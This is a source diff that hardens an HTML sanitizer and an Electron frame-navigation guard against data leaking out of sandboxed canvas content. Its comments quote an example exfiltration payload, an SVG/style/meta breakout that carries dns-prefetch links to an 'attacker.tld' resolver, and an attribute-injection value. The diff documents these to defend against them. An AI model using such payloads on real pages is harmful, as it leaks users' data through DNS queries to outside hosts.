@@ -290,8 +290,10 @@ function baseHeaders(contentType: string, csp?: string): Record<string, string> 
  * Named references are not decoded: none of them produce an ASCII letter, so
  * none can smuggle a character into `content-security-policy`.
  */
+const ATTR_CHAR_REF_SOURCE = '&#(x[0-9a-f]+|[0-9]+);?'
+
 function decodeAttrCharRefs(value: string): string {
-  return value.replace(/&#(x[0-9a-f]+|[0-9]+);?/gi, (whole, digits: string) => {
+  return value.replace(new RegExp(ATTR_CHAR_REF_SOURCE, 'gi'), (whole, digits: string) => {
     const hex = digits[0] === 'x' || digits[0] === 'X'
     const code = Number.parseInt(hex ? digits.slice(1) : digits, hex ? 16 : 10)
     if (!Number.isFinite(code) || code < 0 || code > 0x10ffff) return whole
@@ -335,6 +337,13 @@ interface ScannedTag {
   /** Index one past the tag's closing '>' (or the end of the string). */
   end: number
   attrs: Map<string, ScannedAttr>
+  /**
+   * The tokenizer's self-closing FLAG — a '/' immediately before the '>', and
+   * nothing else. It is ignored for HTML elements (`<div/>` opens a div), which
+   * is why nothing used it before; a FOREIGN element honours it, so
+   * `<svg/>` opens no foreign content and `<svg><desc/>` no integration point.
+   */
+  selfClosing: boolean
 }
 
 /**
@@ -353,9 +362,17 @@ function scanTag(html: string, start: number): ScannedTag {
   while (i < html.length && !endsName(html[i])) i++
   const name = html.slice(nameStart, i).toLowerCase()
   while (i < html.length) {
-    while (i < html.length && (isTagSpace(html[i]) || html[i] === '/')) i++
+    // The self-closing flag is set only when the '/' is the character right
+    // before the '>' — `<svg / >` is not self-closing, and a trailing slash
+    // inside an UNQUOTED value (`<svg a=b/>`) belongs to the value, which is
+    // why this is tracked here rather than read off `html[end - 2]`.
+    let slashRunToGt = false
+    while (i < html.length && (isTagSpace(html[i]) || html[i] === '/')) {
+      slashRunToGt = html[i] === '/'
+      i++
+    }
     if (i >= html.length) break
-    if (html[i] === '>') return { name, end: i + 1, attrs }
+    if (html[i] === '>') return { name, end: i + 1, attrs, selfClosing: slashRunToGt }
     let attrName = ''
     while (i < html.length && !endsName(html[i]) && html[i] !== '=') attrName += html[i++]
     while (i < html.length && isTagSpace(html[i])) i++
@@ -385,7 +402,7 @@ function scanTag(html: string, start: number): ScannedTag {
     const key = attrName.toLowerCase()
     if (key.length > 0 && !attrs.has(key)) attrs.set(key, { value: html.slice(start_, end_), start: start_, end: end_ })
   }
-  return { name, end: html.length, attrs }
+  return { name, end: html.length, attrs, selfClosing: false }
 }
 
 /**
@@ -429,18 +446,144 @@ function endOfBogusComment(html: string, lt: number): number {
   return gt < 0 ? html.length : gt + 1
 }
 
-/** Contents are not markup at all (RAWTEXT). */
-const RAW_TEXT_ELEMENTS = new Set(['script', 'style', 'xmp', 'iframe', 'noembed', 'noframes'])
+/**
+ * Contents are not markup at all (RAWTEXT).
+ *
+ * `noscript` is in this set because of a property of the DEPLOYMENT, not of the
+ * element: its contents are RAWTEXT only when scripting is ENABLED, and every
+ * mount site of canvas content enables it — the visible pane
+ * (`AgentCanvasPane`) and the off-screen capture frame
+ * (`canvas-headless-capture`) both carry
+ * `sandbox="allow-scripts allow-same-origin allow-forms"`, and the injected
+ * bridge (so canvas_snapshot and canvas_review) does not work at all without
+ * it. The comment that stood here had it backwards (adversarial review,
+ * 2026-08-16): it justified visiting inside `<noscript>` as refusing to
+ * "treat a live element as inert", when in THIS frame the visiting was the
+ * error — editing bytes the canvas frame never parses as markup and never
+ * renders.
+ *
+ * Residual, in the direction that matters: mount canvas content with scripting
+ * OFF and a `<link rel=dns-prefetch>` inside a `<noscript>` becomes live markup
+ * that is no longer stripped. `X-DNS-Prefetch-Control: off` (baseHeaders) is
+ * what covers it there, and such a frame is already broken (no bridge, no
+ * snapshot). Note the oracle for this one element is a scripting-ENABLED parse;
+ * jsdom's default is scripting OFF, so the differential has to ask for it.
+ */
+const RAW_TEXT_ELEMENTS = new Set(['script', 'style', 'xmp', 'iframe', 'noembed', 'noframes', 'noscript'])
 /** Contents are text with character references (RCDATA) — still not markup, so a
  *  `<meta …>` written inside one is VISIBLE TEXT the browser shows. Splicing it
  *  out silently edited the page's own content.
  *
- *  Known residual, stated rather than hidden: inside FOREIGN content (`<svg>`,
- *  MathML) `<title>` is an ordinary element whose children are markup, so a
- *  pragma there is skipped when the parser would build it. That errs toward
- *  leaving an element standing, which is the bounded direction — the served
- *  header is authoritative and a `<meta>` policy can only intersect it. */
+ *  BOTH sets are HTML-CONTENT-ONLY. Inside `<svg>`/`<math>` these names lose
+ *  their content model completely, which is what the foreign-content tracking
+ *  below exists for — it used to be a documented residual right here, and
+ *  measurement showed it was not the harmless one the note claimed. */
 const RCDATA_ELEMENTS = new Set(['textarea', 'title'])
+
+// ---------------------------------------------------------------------------
+// Foreign content (SVG / MathML)
+//
+// Inside `<svg>` and `<math>` the names above mean nothing: `style`, `script`,
+// `textarea`, `xmp`, `iframe`, `noembed` and `title` are ordinary foreign
+// elements whose children are MARKUP. A walker that skips to their end tag
+// anyway is wrong in both directions, and the second one is not theoretical
+// (adversarial review, 2026-08-16 — the differential corpus in
+// tests/unit/main/canvas-content-egress.test.ts measures every claim here
+// against parse5 rather than against a reading of the spec):
+//
+//   <svg><style><meta><link rel=dns-prefetch href="//<chunk>.attacker.tld">…
+//
+// `<meta>` is a BREAKOUT element: the parser pops out of foreign content there
+// and everything after it is HTML again, so those links are LIVE html `<link>`
+// elements with a working relList — one DNS query per chunk at the attacker's
+// own resolver, with the entire hint strip walked past because the walker was
+// still skipping to `</style>`. Same shape with `<svg><script>`,
+// `<svg><textarea>`, `<svg><xmp>`, `<svg><iframe>`, `<svg><noembed>`, and with
+// `<svg><title>`, which is an HTML integration point where a `<link>` is live
+// HTML outright. THAT is why the awareness below is here and not a comment:
+// the pragma half of it would have been inert (an `<svg>` can never be a child
+// of `<head>` — the tree builder pops head and opens body before it processes
+// one — and Chromium only honours a CSP `<meta>` that IS a head child), but the
+// hint half is a working channel and the hint half is the one CSP cannot cover.
+//
+// The other direction is a bounded over-strip of the page's own markup:
+// `<svg><link rel="dns-prefetch">` is an SVG-namespace `link` with no relList
+// and no hint, and the walker deleted it.
+//
+// What is modeled:
+//   - ENTER on `<svg>`/`<math>` in HTML content, unless the start tag is
+//     self-closing (a foreign element honours that flag, an HTML one ignores it);
+//   - HTML PARSING RESUMES inside an HTML integration point — SVG
+//     `foreignObject`/`desc`/`title`, MathML `annotation-xml` with an HTML
+//     encoding, and the MathML text integration points — where `<style>` is
+//     RAWTEXT again and a `<link rel=dns-prefetch>` is a live hint;
+//   - LEAVE on the matching end tag, on a breakout start tag, or on `</p>` /
+//     `</br>` (measured: of eighteen end tags tried inside `<svg><style>`,
+//     exactly those two put the following `<link>` in the HTML namespace, and
+//     they pop only as far as the nearest integration point);
+//   - in foreign content only breakout tags are visited, because only they are
+//     HTML elements — which is exactly what keeps `<svg><link>` alone.
+//
+// Residuals, both under-strip, both bounded to a PRAGMA and never to a hint:
+// `<mglyph>`/`<malignmark>` inside a MathML text integration point return to
+// foreign parsing and are not modeled (measured: a `<link>` under one stays
+// MathML-namespace and inert, a `<meta>` breaks out and survives); and a CDATA
+// section is consumed by the bogus-comment path rather than to `]]>`, which the
+// corpus measures landing in the same place for both element names.
+// ---------------------------------------------------------------------------
+
+/** Start tags that BREAK OUT of foreign content: the parser pops back to HTML
+ *  content and inserts them as HTML elements, so everything after one is HTML
+ *  again. (`font` only when it carries color/face/size — measured both ways.) */
+const FOREIGN_BREAKOUT_ELEMENTS = new Set([
+  'b', 'big', 'blockquote', 'body', 'br', 'center', 'code', 'dd', 'div', 'dl', 'dt', 'em', 'embed',
+  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'hr', 'i', 'img', 'li', 'listing', 'menu', 'meta',
+  'nobr', 'ol', 'p', 'pre', 'ruby', 's', 'small', 'span', 'strong', 'strike', 'sub', 'sup', 'table',
+  'tt', 'u', 'ul', 'var',
+])
+
+/** End tags that leave foreign content without naming an open foreign element.
+ *  Both are the HTML-content rules that SYNTHESISE an element (`</br>` acts as
+ *  `<br>`; `</p>` opens and closes one), which is why only these two do it. */
+const FOREIGN_BREAKOUT_END_TAGS = new Set(['p', 'br'])
+
+/** SVG elements that are HTML integration points: HTML parsing resumes inside. */
+const SVG_HTML_INTEGRATION_POINTS = new Set(['foreignobject', 'desc', 'title'])
+
+/** MathML text integration points; `annotation-xml` is conditional, see below. */
+const MATHML_TEXT_INTEGRATION_POINTS = new Set(['mi', 'mo', 'mn', 'ms', 'mtext'])
+
+type ForeignNamespace = 'svg' | 'math'
+
+interface ForeignFrame {
+  /** Lowercased name of the tag that opened this frame; its end tag closes it. */
+  name: string
+  /** 'foreign' — children are foreign markup. 'html' — an integration point,
+   *  inside which HTML parsing (and with it RAWTEXT/RCDATA) resumes. */
+  kind: 'foreign' | 'html'
+  /** The foreign root this frame sits under, which decides what counts as an
+   *  integration point below it: `<svg><math>` is an SVG-namespace `math`, not
+   *  MathML, so its `<ms>` is NOT a text integration point. */
+  namespace: ForeignNamespace
+}
+
+function breaksOutOfForeignContent(tag: ScannedTag): boolean {
+  if (FOREIGN_BREAKOUT_ELEMENTS.has(tag.name)) return true
+  return tag.name === 'font' && (tag.attrs.has('color') || tag.attrs.has('face') || tag.attrs.has('size'))
+}
+
+function isHtmlIntegrationPoint(tag: ScannedTag, namespace: ForeignNamespace): boolean {
+  if (namespace === 'svg') return SVG_HTML_INTEGRATION_POINTS.has(tag.name)
+  if (MATHML_TEXT_INTEGRATION_POINTS.has(tag.name)) return true
+  if (tag.name !== 'annotation-xml') return false
+  const encoding = tag.attrs.get('encoding')
+  if (encoding === undefined) return false
+  // The encoding decides it: without one (or with any other) the element is
+  // foreign and a `<meta>` inside still breaks out. Decoded and trimmed for the
+  // same reason `http-equiv` is.
+  const value = decodeAttrCharRefs(encoding.value).trim().toLowerCase()
+  return value === 'text/html' || value === 'application/xhtml+xml'
+}
 
 /**
  * Index of the '<' that opens `</name`'s end tag, or the end of the string.
@@ -483,9 +626,11 @@ interface MarkupEdit {
  * `<template>` contents are tracked but NOT visited: they parse as elements, in
  * a fragment that is not in a document, so a pragma there never applies and a
  * hint there never resolves — removing them was pure corruption of the page's
- * own markup. (`<noscript>` is deliberately not in that set: whether its
- * contents are markup depends on scripting being enabled, and treating a live
- * element as inert is the wrong direction to guess in.)
+ * own markup.
+ *
+ * `frames` is the foreign-content stack described above the table of breakout
+ * elements: its top decides whether the names in RAW_TEXT_ELEMENTS /
+ * RCDATA_ELEMENTS mean anything at all right now.
  */
 function rewriteMarkup(html: string, visit: (tag: ScannedTag, start: number) => MarkupEdit | null): string {
   // One lowercased copy for the end-tag searches: doing it per `<script>` would
@@ -493,6 +638,13 @@ function rewriteMarkup(html: string, visit: (tag: ScannedTag, start: number) => 
   const lower = html.toLowerCase()
   const edits: MarkupEdit[] = []
   let templateDepth = 0
+  // Empty, or a 'html' frame on top, means HTML content; a 'foreign' frame on
+  // top means we are inside SVG/MathML markup.
+  const frames: ForeignFrame[] = []
+  const inForeignContent = (): boolean => frames.length > 0 && frames[frames.length - 1].kind === 'foreign'
+  const leaveForeignContent = (): void => {
+    while (inForeignContent()) frames.pop()
+  }
   let i = 0
   while (i < html.length) {
     const lt = html.indexOf('<', i)
@@ -512,7 +664,21 @@ function rewriteMarkup(html: string, visit: (tag: ScannedTag, start: number) => 
         continue
       }
       const tag = scanTag(html, lt)
-      if (tag.name === 'template' && templateDepth > 0) templateDepth--
+      let open = -1
+      for (let f = frames.length - 1; f >= 0; f--) {
+        if (frames[f].name === tag.name) {
+          open = f
+          break
+        }
+      }
+      if (open >= 0) {
+        // Closes that element — and with it anything still open inside it.
+        frames.length = open
+      } else if (inForeignContent() && FOREIGN_BREAKOUT_END_TAGS.has(tag.name)) {
+        leaveForeignContent()
+      } else if (tag.name === 'template' && templateDepth > 0) {
+        templateDepth--
+      }
       i = tag.end
       continue
     }
@@ -521,6 +687,18 @@ function rewriteMarkup(html: string, visit: (tag: ScannedTag, start: number) => 
       continue
     }
     const tag = scanTag(html, lt)
+    if (inForeignContent() && !breaksOutOfForeignContent(tag)) {
+      // A FOREIGN element: not an HTML `<meta>`/`<link>` however it is spelled,
+      // so never visited, and its children are markup rather than text however
+      // it is named, so never skipped.
+      const namespace = frames[frames.length - 1].namespace
+      if (!tag.selfClosing && isHtmlIntegrationPoint(tag, namespace)) {
+        frames.push({ name: tag.name, kind: 'html', namespace })
+      }
+      i = tag.end
+      continue
+    }
+    leaveForeignContent() // a breakout tag, if we were in foreign content at all
     if (templateDepth === 0) {
       const edit = visit(tag, lt)
       if (edit) edits.push(edit)
@@ -529,6 +707,9 @@ function rewriteMarkup(html: string, visit: (tag: ScannedTag, start: number) => 
       // A self-closing flag on `<template>` is ignored in HTML content (parse
       // error), so this opens one either way.
       templateDepth++
+      i = tag.end
+    } else if ((tag.name === 'svg' || tag.name === 'math') && !tag.selfClosing) {
+      frames.push({ name: tag.name, kind: 'foreign', namespace: tag.name })
       i = tag.end
     } else if (RAW_TEXT_ELEMENTS.has(tag.name) || RCDATA_ELEMENTS.has(tag.name)) {
       i = endOfTextContent(html, lower, tag.end, tag.name)
@@ -555,16 +736,60 @@ const CSP_PRAGMA_RE = /^content-security-policy(-report-only)?$/
  */
 const EGRESS_HINT_RELS = new Set(['dns-prefetch', 'preconnect', 'prefetch', 'prerender'])
 
-/** The whitespace `rel` is split on — a DOMTokenList, so ASCII whitespace. */
-const REL_SPLIT_RE = /[\t\n\f\r ]+/
+/** One `rel` token: what the browser sees after decoding, and the half-open
+ *  span of RAW text it came from so a rewrite can put the original bytes back. */
+interface RelToken {
+  decoded: string
+  rawStart: number
+  rawEnd: number
+}
 
-/** Would the browser see this raw token as one of the hint rels? Decoded first
- *  (`&#100;ns-prefetch`), and re-split after decoding because a numeric
- *  reference can itself decode to whitespace. */
-function isEgressHintToken(rawToken: string): boolean {
-  return decodeAttrCharRefs(rawToken)
-    .split(REL_SPLIT_RE)
-    .some((token) => EGRESS_HINT_RELS.has(token.toLowerCase()))
+/**
+ * Split a raw `rel` value the way a DOMTokenList does — on ASCII whitespace in
+ * the DECODED value — while keeping every token's raw span.
+ *
+ * Splitting the RAW text and classifying the pieces after decoding is a
+ * MEASURED over-strip (adversarial review, 2026-08-16):
+ * `rel="stylesheet&#32;dns-prefetch"` is one raw token that decodes to two, so
+ * it classified as a hint, nothing was left to keep, and the whole element went
+ * — taking the page's stylesheet with it. A `&#9;` separator does the same, and
+ * so would `icon`/`preload`.
+ *
+ * Writing kept tokens back from their RAW spans is what keeps the rewrite
+ * injection-proof and is not incidental: a decoded token can contain the quote
+ * that would end the attribute (`stylesheet&#34; onload=&#34;…`), so `&#34;`
+ * has to go back as `&#34;`.
+ */
+function relTokens(raw: string): RelToken[] {
+  const tokens: RelToken[] = []
+  let current: RelToken | null = null
+  const push = (text: string, from: number, to: number): void => {
+    if (isTagSpace(text)) {
+      current = null // a separator, however it was spelled
+      return
+    }
+    if (current === null) {
+      current = { decoded: text, rawStart: from, rawEnd: to }
+      tokens.push(current)
+    } else {
+      current.decoded += text
+      current.rawEnd = to
+    }
+  }
+  const ref = new RegExp(ATTR_CHAR_REF_SOURCE, 'gi')
+  let at = 0
+  for (;;) {
+    ref.lastIndex = at
+    const match = ref.exec(raw)
+    const upto = match ? match.index : raw.length
+    for (let k = at; k < upto; k++) push(raw[k], k, k + 1)
+    if (match === null) break
+    // Every character the reference decodes to maps back to the WHOLE
+    // reference, so a kept token that contains one carries it out verbatim.
+    for (const char of decodeAttrCharRefs(match[0])) push(char, match.index, match.index + match[0].length)
+    at = match.index + match[0].length
+  }
+  return tokens
 }
 
 /**
@@ -588,9 +813,11 @@ function isEgressHintToken(rawToken: string): boolean {
  * that also reaches script-created hints.
  *
  * A `rel` carrying other tokens keeps them — only the hint tokens are dropped,
- * written back from the RAW substrings so nothing can be injected through the
- * rewrite (a decoded token could contain the quote that ends the attribute).
- * An element whose `rel` was ONLY hints is removed outright.
+ * tokenised on the DECODED value (`relTokens`, so a `&#32;` separator cannot
+ * fuse `stylesheet` to a hint and take it down with it) and written back from
+ * the RAW substrings so nothing can be injected through the rewrite (a decoded
+ * token could contain the quote that ends the attribute). An element whose
+ * `rel` was ONLY hints is removed outright.
  */
 export function sanitizeServedHtml(html: string): string {
   return rewriteMarkup(html, (tag, start) => {
@@ -603,11 +830,15 @@ export function sanitizeServedHtml(html: string): string {
     if (tag.name === 'link') {
       const rel = tag.attrs.get('rel')
       if (rel === undefined) return null
-      const tokens = rel.value.split(REL_SPLIT_RE).filter((token) => token.length > 0)
-      const kept = tokens.filter((token) => !isEgressHintToken(token))
+      const tokens = relTokens(rel.value)
+      const kept = tokens.filter((token) => !EGRESS_HINT_RELS.has(token.decoded.toLowerCase()))
       if (kept.length === tokens.length) return null
       if (kept.length === 0) return { start, end: tag.end, text: '' }
-      return { start: rel.start, end: rel.end, text: kept.join(' ') }
+      return {
+        start: rel.start,
+        end: rel.end,
+        text: kept.map((token) => rel.value.slice(token.rawStart, token.rawEnd)).join(' '),
+      }
     }
     return null
   })
@@ -910,9 +1141,14 @@ function canvasScopeOf(url: string): string | null {
  *
  * The rule is one sentence: ONCE A FRAME IS SHOWING A CANVAS VERSION IT MAY
  * ONLY EVER NAVIGATE WITHIN THAT VERSION. A frame that is not showing a canvas
- * (`about:blank`, the app's own document, an empty string) is not this
- * function's business and is allowed — that is the initial mount, and the app
- * renderer's `will-navigate` + `frame-src ccc-ux:` govern it.
+ * (`about:blank`, the app's own document) is not this function's business and
+ * is allowed — that is the initial mount, and the app renderer's
+ * `will-navigate` + `frame-src ccc-ux:` govern it.
+ *
+ * An empty string answers "not a canvas" here too, which is a true statement
+ * about the STRING and not a decision about a navigation: the guard below no
+ * longer routes one here, because an empty url does not say which document is
+ * navigating. See `installCanvasFrameNavigationGuard`.
  *
  * WHAT THIS CLOSES (adversarial review, 2026-08-15). `will-navigate` fires for
  * the MAIN FRAME ONLY, so before this the entire off-origin defence for canvas
@@ -944,13 +1180,34 @@ export function isCanvasFrameNavigationAllowed(currentUrl: string, targetUrl: st
 export interface CanvasFrameNavigationDetails {
   url: string
   isMainFrame: boolean
-  frame?: { url?: string } | null
+  /** `parent` is read only to tell the canvas pane's own iframe (whose parent is
+   *  the APP's document) from a subframe of a canvas document — see the
+   *  empty-url rule on the installer. */
+  frame?: { url?: string; parent?: { url?: string } | null } | null
   initiator?: { url?: string } | null
   preventDefault: () => void
 }
 
 export interface FrameNavigationEmitter {
   on(event: 'will-frame-navigate', listener: (details: CanvasFrameNavigationDetails) => void): unknown
+}
+
+/**
+ * The ONE navigation an unidentified frame is allowed to be: the canvas pane's
+ * own iframe, which has committed nothing yet (`frame.url === ''`), taking its
+ * first hop INTO a canvas version.
+ *
+ * Both halves are needed. The parent test is what separates the pane's frame —
+ * a direct child of the app's own document — from an uncommitted subframe
+ * INSIDE a canvas document, which reports the same empty url and whose parent
+ * IS canvas content. The target test is what keeps the allowance to a mount
+ * rather than to any first hop: a frame nobody can identify navigating OFF the
+ * scheme is the exfiltration shape, not a mount.
+ */
+function isCanvasPaneMount(details: CanvasFrameNavigationDetails): boolean {
+  const parentUrl = details.frame?.parent?.url
+  if (typeof parentUrl !== 'string' || parentUrl.length === 0) return false
+  return canvasScopeOf(parentUrl) === null && canvasScopeOf(details.url) !== null
 }
 
 /**
@@ -966,26 +1223,51 @@ export interface FrameNavigationEmitter {
  * input can be null is a guard with an off switch; the initiator covers that
  * case, and for a self-navigation the two are the same frame anyway.
  *
- * WHEN BOTH ARE ABSENT THE ANSWER IS NO (adversarial review, 2026-08-16). The
- * loop used to fall through to "allowed" when neither source was a string,
- * which is the one case where the guard knows NOTHING about who is navigating —
- * exactly when it must not decide in the navigation's favour. The `catch` below
- * fails closed on a throw, but this was not a throw.
+ * WHEN NO SOURCE IDENTIFIES THE NAVIGATING DOCUMENT THE ANSWER IS NO
+ * (adversarial review, 2026-08-16). The loop used to fall through to "allowed"
+ * when neither source was a string, which is the one case where the guard knows
+ * NOTHING about who is navigating — exactly when it must not decide in the
+ * navigation's favour. The `catch` below fails closed on a throw, but this was
+ * not a throw.
  *
- * An EMPTY string is information and stays allowed: it is a frame with no
- * committed document, i.e. the initial mount of the canvas iframe, and refusing
- * that would leave the pane permanently blank. `canvasScopeOf` already answers
- * "not a canvas" for it. The fail-closed case is the absence of any source at
- * all — null/undefined on both.
+ * AN EMPTY STRING IS NOT INFORMATION EITHER, and that is the second half of the
+ * same finding. The note that stood here called `''` "a frame with no committed
+ * document, i.e. the initial mount", and concluded it had to stay allowed or
+ * the pane would never mount. The first half is true and the second does not
+ * follow: an uncommitted SUBFRAME of a canvas document — a src-less `<iframe>`
+ * a canvas page created — reports `''` too, and `canvasScopeOf('')` is null, so
+ * it was free to take its first hop anywhere.
+ *
+ * An empty url is therefore dropped from the source list rather than counted as
+ * an allowing one. That changes the outcome in exactly ONE case: when it was
+ * the only source. (When it is not, the loop already answers from the other one
+ * — it refuses if ANY source refuses, so an allowing `''` never overrode
+ * anything.) Blanking the pane would take that case AND the mount reporting no
+ * initiator, so the allowance is NARROWED to the mount's own shape instead of
+ * removed: an uncommitted frame whose PARENT is not canvas content, hopping
+ * INTO a canvas version. Both mount sites (`AgentCanvasPane` and the off-screen
+ * capture frame) are direct children of the app's own document, so they pass;
+ * a src-less child of a canvas document has a canvas parent and fails; a frame
+ * that reports no parent at all fails, which is the fail-closed direction.
+ *
+ * WHAT THIS CANNOT SETTLE HERE: whether `will-frame-navigate` reports
+ * `initiator` and `frame.parent` for an iframe's FIRST src load is a property
+ * of the running Electron, not of this module — the unit tests drive the
+ * listener with a structural double, and only a real window can answer it. The
+ * shapes that already refused before this change (`frame` null with no
+ * initiator) still refuse, so the exposure added is bounded to one: a mount
+ * that reports neither an initiator nor a parent would refuse and leave the
+ * pane blank, with the console.warn below as the only trace.
  */
 export function installCanvasFrameNavigationGuard(contents: FrameNavigationEmitter): void {
   contents.on('will-frame-navigate', (details) => {
     try {
       if (details.isMainFrame) return
       const sources = [details.frame?.url, details.initiator?.url].filter(
-        (source): source is string => typeof source === 'string',
+        (source): source is string => typeof source === 'string' && source.length > 0,
       )
       if (sources.length === 0) {
+        if (isCanvasPaneMount(details)) return
         details.preventDefault()
         console.warn(
           `[ccc-ux] blocked a canvas frame navigation with no identifiable source (to ${details.url})`,
